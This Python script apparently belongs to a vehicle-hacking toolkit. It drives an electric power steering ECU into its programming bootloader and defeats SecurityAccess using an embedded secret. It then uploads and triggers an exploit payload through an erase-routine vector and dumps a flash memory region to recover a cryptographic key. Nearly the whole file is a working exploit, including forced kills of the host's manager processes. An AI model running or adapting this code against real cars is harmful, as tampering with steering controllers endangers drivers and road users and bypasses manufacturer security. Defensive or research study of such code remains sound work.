#!/usr/bin/env python3
"""DataFlash dump: upload the exploit payload and dump EPS memory 0xFF200000-0xFF208000.

Vehicle requirement: Not Ready to Drive mode (not READY Mode). May need two runs with a power cycle
between them (prime + dump). The first run often primes the EPS and returns 1-2
frames; a full dump follows on the second run after a power cycle.

This shares the UDS session-setup preamble with tsk/lib/extractor.py but is a
distinct operation: a different payload (payload_dataflash_ff200000_ff208000.bin),
a different dump range, and a raw frame collector instead of the key-struct parser.
The ~6 shared preamble lines are deliberately duplicated so the two operations
stay independently testable rather than coupled through a shared helper.
"""
import hashlib
import struct
import subprocess
import time
from pathlib import Path

from tsk.lib.diagnostic_route import (
  AmbiguousDiagnosticRouteError, discover_eps_route_with_routing, route_fields,
)
from tsk.lib.env import (
  is_agnos, DATAFLASH_AUTORESET_PAYLOAD_PATH, DATAFLASH_DIR, DATAFLASH_PAYLOAD_PATH,
)
from tsk.lib.extractor import NotAGNOSError, RetryError, TSKExtractor
from tsk.lib.bootstrap_profile import (
  BootstrapProfileError, public_bootstrap_status, require_evidenced_fixture,
)
from tsk.lib.programming import ProgrammingHandoffError, enter_programming_bootloader, uds_client
from tsk.lib.ram_exec_geometry import (
  COMMITTED_PAYLOAD_CONTRACT,
  RamExecGeometry,
  RamExecGeometryError,
  build_request_download_data,
  build_verify_routine_data,
  resolve_ram_exec_geometry,
  transfer_chunks,
)

# EPS UDS parameters (shared with the extractor)
ADDR = TSKExtractor.ADDR  # 0x7a1
CANDIDATE_BUSES = TSKExtractor.CANDIDATE_BUSES

# Dump range
DUMP_START = 0xFF200000
DUMP_END = 0xFF208000
DUMP_TOTAL = DUMP_END - DUMP_START  # 0x8000 == 32768

# Historical Sienna/Yaris candidate location. Retained for targeted diagnostics only;
# partial-dump usability is no longer gated on this cross-calibration assumption.
KEY_SIZE = 16
KNOWN_KEY_OFFSET = 0x6E14

# Payload upload/trigger vector. The committed fixtures are post-link packages bound
# to the verified 4 KiB FEBF0000 callback geometry. Keep aliases for callers/tests, but
# derive them from the explicit package contract rather than treating them as a generic
# cross-calibration RAM window.
PAYLOAD_LOAD_ADDR = COMMITTED_PAYLOAD_CONTRACT.load_addr
PAYLOAD_LOAD_SIZE = COMMITTED_PAYLOAD_CONTRACT.size
TRIGGER_ADDR = 0x000E0000
TRIGGER_SIZE = 0x8000
PAYLOAD_SHA256 = "d48988366b5e6d2ddd7438caca5e6f6f02daba9b650263c323a2ffd770a06e34"
# Local derivative of Vance candidate-f05: identical verified RH850 body/CRC region,
# but CMAC + ciphertext rebuilt under the analyzed Sienna's normal PAYLOAD_BUILD_SECRET
# instead of candidate-f05's unusual bootloader-SecurityAccess-secret build. The original external
# candidate ciphertext is 296d87d2... and is provenance evidence only, not sent.
AUTORESET_PAYLOAD_SHA256 = "bf62449f85648ea24708961749bf53f75f36083c01bcf54114d567da0e178725"

# Frame collection timing
IDLE_TIMEOUT = 10.0
MAX_SECONDS = 240.0
RESPONSE_PENDING = b"\x03\x7f\x31\x78\x00\x00\x00\x00"

DUMP_FILENAME = f"dump_{DUMP_START:08x}_{DUMP_END:08x}.bin"


def dump_path() -> Path:
  return Path(DATAFLASH_DIR) / DUMP_FILENAME


def partial_dump_path() -> Path:
  return Path(str(dump_path()) + ".partial")


def partial_coverage_path() -> Path:
  return Path(str(partial_dump_path()) + ".coverage")


def _noop(**kwargs) -> None:
  pass


def _longest_covered_run(received) -> int:
  longest = 0
  current = 0
  for covered in received:
    if covered:
      current += 1
      longest = max(longest, current)
    else:
      current = 0
  return longest


def _finalize(dump_buf, received, frames_count, bytes_received) -> dict:
  """Persist complete dumps or any partial with a candidate-sized covered window.

  The old collector kept a partial only when the Sienna/Yaris 0x6E14 key window was
  present. That silently discarded useful cross-calibration evidence. New partials
  carry a byte-coverage sidecar and are eligible whenever at least one contiguous
  16-byte window exists; the CMAC matcher decides whether any covered window is a key.
  """
  path = dump_path()
  partial_path = partial_dump_path()
  coverage_path = partial_coverage_path()

  # Complete: full coverage. Remove stale partial artifacts from an earlier run.
  if bytes_received >= DUMP_TOTAL:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_bytes(bytes(dump_buf))
    for stale in (partial_path, coverage_path):
      try:
        stale.unlink()
      except FileNotFoundError:
        pass
    return {
      "status": "complete",
      "frames": frames_count,
      "bytes": bytes_received,
      "total": DUMP_TOTAL,
      "dump_path": str(path),
      "coverage_path": "",
      "message": "Dump complete.",
    }

  longest_run = _longest_covered_run(received)
  known_key_covered = all(received[KNOWN_KEY_OFFSET:KNOWN_KEY_OFFSET + KEY_SIZE])
  if longest_run < KEY_SIZE:
    return {
      "status": "unusable_partial",
      "frames": frames_count,
      "bytes": bytes_received,
      "total": DUMP_TOTAL,
      "dump_path": "",
      "coverage_path": "",
      "longest_covered_run": longest_run,
      "known_key_window_covered": known_key_covered,
      "message": (f"Partial dump ({bytes_received}/{DUMP_TOTAL} bytes) has no contiguous " +
                  f"{KEY_SIZE}-byte candidate window. Restart the car into Not Ready To Drive mode and dump again."),
    }

  partial_path.parent.mkdir(parents=True, exist_ok=True)
  partial_path.write_bytes(bytes(dump_buf))
  coverage_path.write_bytes(bytes(received))
  return {
    "status": "partial",
    "frames": frames_count,
    "bytes": bytes_received,
    "total": DUMP_TOTAL,
    "dump_path": str(partial_path),
    "coverage_path": str(coverage_path),
    "longest_covered_run": longest_run,
    "known_key_window_covered": known_key_covered,
    "message": (f"Partial dump ({bytes_received}/{DUMP_TOTAL} bytes; longest covered run {longest_run}).\n" +
                "All fully covered 16-byte windows are eligible for cryptographic matching.\n" +
                "If no key verifies, restart the car into Not Ready To Drive mode and dump again."),
  }


def dump(progress_cb=None, *, auto_reset: bool = False,
         ram_geometry: RamExecGeometry | None = None) -> dict:
  """Upload the payload and dump 0xFF200000-0xFF208000 from the EPS.

  ``auto_reset`` explicitly opts into a local derivative of the statically recovered
  candidate-f05 body: the same full dump + boot-reset code, re-authenticated under
  the analyzed Sienna's normal payload-build gate. The raw external candidate
  ciphertext is never sent. This variant is never selected implicitly.

  ``ram_geometry`` is a future evidence-bound override. It must name the exact F181 and
  prove authenticated download + callback geometry; the committed payload itself must
  also match that geometry. A linker VMA or successful PROGRAMMING handoff is insufficient.

  progress_cb, if given, is called as
    progress_cb(status=, frames=, bytes_done=, total=, message=)
  with whichever keys changed. Returns a dict:
    {status, frames, bytes, total, dump_path, message}
  where status is one of: complete | partial | unusable_partial | failed.
  Raises NotAGNOSError off-device.
  """
  if not is_agnos():
    raise NotAGNOSError

  cb = progress_cb or _noop

  from Crypto.Cipher import AES

  from opendbc.car.isotp import isotp_send
  from opendbc.car.uds import ACCESS_TYPE, SESSION_TYPE, SERVICE_TYPE, \
    ROUTINE_CONTROL_TYPE, InvalidServiceIdError, MessageTimeoutError, NegativeResponseError

  # Verify the explicitly selected payload before touching the car.
  payload_path = DATAFLASH_AUTORESET_PAYLOAD_PATH if auto_reset else DATAFLASH_PAYLOAD_PATH
  expected_payload_sha = AUTORESET_PAYLOAD_SHA256 if auto_reset else PAYLOAD_SHA256
  payload = Path(payload_path).read_bytes()
  if hashlib.sha256(payload).hexdigest() != expected_payload_sha:
    raise RetryError("DataFlash payload SHA256 mismatch")
  if len(payload) != COMMITTED_PAYLOAD_CONTRACT.size:
    raise RetryError("DataFlash payload wrong size for the committed authenticated package")

  cb(status="running", frames=0, bytes_done=0, total=DUMP_TOTAL, message="")

  # Kill the manager so it doesn't restart pandad mid-dump (mirrors extractor.hack()).
  subprocess.run(["pkill", "-9", "-f", "manager.py"], check=False)
  subprocess.run(["pkill", "-9", "-f", "pandad"], check=False)
  time.sleep(2)

  panda = TSKExtractor._connect_panda()
  try:
    route = discover_eps_route_with_routing(
      panda, CANDIDATE_BUSES, preferred_tx=ADDR, addresses=[ADDR],
      preferred_timeout=0.4, scan_timeout=0.1,
    )
  except AmbiguousDiagnosticRouteError as e:
    raise RetryError(f"Ambiguous EPS diagnostic route: {e}") from e
  if route is None:
    raise RetryError("EPS did not answer under normal-harness or OBD routing")
  if route["tx"] != ADDR or route["rx"] != ADDR + 8 or route["tx_bus"] != route["rx_bus"]:
    raise RetryError(f"Responder does not match the evidenced EPS payload route: {route_fields(route)}")

  # Resolve the complete authenticated RAM-exec geometry from the application identity
  # before any PROGRAMMING request, SecurityAccess key, DID write, or download is sent.
  # A bootloader reappearance on this route does not prove the payload window.
  app_uds = uds_client(panda, route, timeout=0.3, response_pending_timeout=3.0)
  try:
    app_f181 = bytes(app_uds.read_data_by_identifier(0xF181))
  except Exception as e:
    raise RetryError("Could not read EPS F181 before the state-changing payload flow") from e
  try:
    resolved_geometry = resolve_ram_exec_geometry(app_f181, explicit=ram_geometry)
    COMMITTED_PAYLOAD_CONTRACT.validate_geometry(resolved_geometry)
  except RamExecGeometryError as e:
    raise RetryError(
      "Refusing DataFlash payload before PROGRAMMING: " +
      f"{e}. Programming handoff or linker-VMA evidence alone cannot authorize this upload."
    ) from e
  try:
    bootstrap_evidence = require_evidenced_fixture(app_f181, expected_payload_sha)
  except BootstrapProfileError as e:
    raise RetryError(
      "Refusing DataFlash payload before PROGRAMMING: authenticated RAM-exec geometry may be "
      + "compatible, but exact encrypted-fixture acceptance is a separate gate. " + str(e)
    ) from e

  # Application -> bootloader is an asynchronous reset handoff. Preserve the exact
  # physical route; a missing final 50 02 is not failure if the bootloader reappears.
  try:
    route, handoff = enter_programming_bootloader(panda, route, prepare_sessions=True,
                                                  settle_extended=0.7)
  except ProgrammingHandoffError as e:
    detail = f" ({e.telemetry})" if e.telemetry else ""
    raise RetryError(f"Can't enter programming bootloader: {e}{detail}") from e

  bus = route["tx_bus"]
  uds = uds_client(panda, route, timeout=0.3, response_pending_timeout=3.0)
  try:
    # Re-establish the known-good bootloader sequence explicitly after the application
    # reset rather than relying on the session left by reappearance probing.
    uds.diagnostic_session_control(SESSION_TYPE.DEFAULT)
    uds.diagnostic_session_control(SESSION_TYPE.EXTENDED_DIAGNOSTIC)
    time.sleep(0.2)
    uds.diagnostic_session_control(SESSION_TYPE.PROGRAMMING)
  except (InvalidServiceIdError, MessageTimeoutError, NegativeResponseError) as e:
    raise RetryError("Bootloader reappeared but did not enter programming session") from e

  # Security access.
  try:
    seed_payload = b"\x00" * 16
    seed = uds.security_access(ACCESS_TYPE.REQUEST_SEED, data_record=seed_payload)
    key = AES.new(TSKExtractor.BOOT_SA_SECRET, AES.MODE_ECB).decrypt(seed_payload)
    key = AES.new(key, AES.MODE_ECB).encrypt(seed)
    uds.security_access(ACCESS_TYPE.SEND_KEY, key)
  except (InvalidServiceIdError, MessageTimeoutError, NegativeResponseError) as e:
    raise RetryError("Security Access failed") from e

  # Upload and verify the payload.
  try:
    uds.write_data_by_identifier(0x203, b"\x00" * 5)
    uds.write_data_by_identifier(0x201, TSKExtractor.DID_201_KEY)
    uds.write_data_by_identifier(0x202, TSKExtractor.DID_202_IV)

    request = build_request_download_data(resolved_geometry)
    uds._uds_request(SERVICE_TYPE.REQUEST_DOWNLOAD, data=request)

    for i, chunk in enumerate(transfer_chunks(payload, resolved_geometry), start=1):
      uds.transfer_data(i, chunk)
    uds.request_transfer_exit()

    verify = build_verify_routine_data(resolved_geometry)
    uds.routine_control(ROUTINE_CONTROL_TYPE.START, 0x10f0, verify)
  except (InvalidServiceIdError, MessageTimeoutError, NegativeResponseError) as e:
    raise RetryError("Payload upload failed") from e

  # Trigger the payload via the erase routine. Send manually so we don't block
  # waiting for a response that never comes. Same vector as extractor.hack().
  erase = b"\x31\x01\xff\x00" + b"\x45\x00" + struct.pack("!I", TRIGGER_ADDR) + struct.pack("!I", TRIGGER_SIZE)
  isotp_send(panda, erase, route["tx"], bus=bus)

  # Collect dump frames. Each frame carries a 24-bit pointer (low 3 bytes of the
  # address) plus 4 data bytes; the top address byte comes from DUMP_START.
  dump_buf = bytearray(DUMP_TOTAL)
  received = bytearray(DUMP_TOTAL)
  frames_count = 0
  bytes_covered = 0
  begin = time.monotonic()
  last_progress = begin

  while True:
    if time.monotonic() - begin > MAX_SECONDS:
      break

    made_progress = False
    for addr, *_, data, bus in panda.can_recv():
      if bus != route["rx_bus"] or addr != route["rx"] or len(data) < 8:
        continue
      if data == RESPONSE_PENDING:
        continue

      ptr_low24 = (struct.unpack("<I", data[:4])[0] >> 8) & 0xFFFFFF
      offset = ((DUMP_START & 0xFF000000) | ptr_low24) - DUMP_START
      if offset < 0 or offset + 4 > DUMP_TOTAL:
        continue

      dump_buf[offset:offset + 4] = data[4:8]
      # Count only newly-covered bytes so a retransmitted or overlapping chunk isn't
      # double-counted. Replaces a per-iteration sum() over the whole 32KB buffer.
      for k in range(offset, offset + 4):
        if received[k] == 0:
          received[k] = 1
          bytes_covered += 1
      frames_count += 1
      made_progress = True

      if frames_count % 256 == 0:
        cb(status="running", frames=frames_count, bytes_done=bytes_covered, total=DUMP_TOTAL)

    if made_progress:
      last_progress = time.monotonic()
    elif time.monotonic() - last_progress > IDLE_TIMEOUT:
      break
    else:
      time.sleep(0.001)

    if bytes_covered >= DUMP_TOTAL:
      break

  bytes_received = bytes_covered
  cb(status="running", frames=frames_count, bytes_done=bytes_received, total=DUMP_TOTAL)
  result = _finalize(dump_buf, received, frames_count, bytes_received)
  result.update(
    route=route_fields(route),
    application_f181=app_f181.hex(),
    ram_exec_geometry={"status": "verified", **resolved_geometry.public_dict()},
    bootstrap=public_bootstrap_status(app_f181, fixture_sha256=expected_payload_sha),
    bootstrap_evidence=bootstrap_evidence.public_dict(),
    programming_handoff=handoff,
    payload_variant="auto-reset-experimental" if auto_reset else "standard",
    payload_sha256=expected_payload_sha,
  )
  return result
